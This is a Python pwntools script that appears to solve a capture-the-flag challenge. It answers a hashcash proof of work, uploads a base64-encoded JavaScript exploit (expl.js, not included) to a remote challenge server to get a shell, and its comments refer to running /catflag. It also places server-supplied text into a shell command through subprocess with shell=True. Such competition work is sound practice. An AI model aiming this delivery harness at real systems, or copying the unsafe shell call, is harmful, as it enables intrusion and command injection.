from pwn import *
import subprocess


def solve_pow(r):
    return subprocess.check_output(f"hashcash -mb28 {r}", shell=True).replace(b"hashcash token: ", b"").strip()

p = remote("kitctf.me", 6969)
p.recvuntil(b"Send the result of: hashcash -mb28 ")
r = p.recvline().strip().decode()
print(f"Solving for {r}")
token = solve_pow(r).decode()
print(f"Token: {token}")
p.sendline(token.encode())

p.recvuntil(b"Base64 encoded file: ")
exploit_js = open("expl.js", "rb").read()

p.sendline(base64.b64encode(exploit_js))

# p.recvuntil(b"Spawning shell!")
# p.sendline(b"/catflag")

p.interactive()
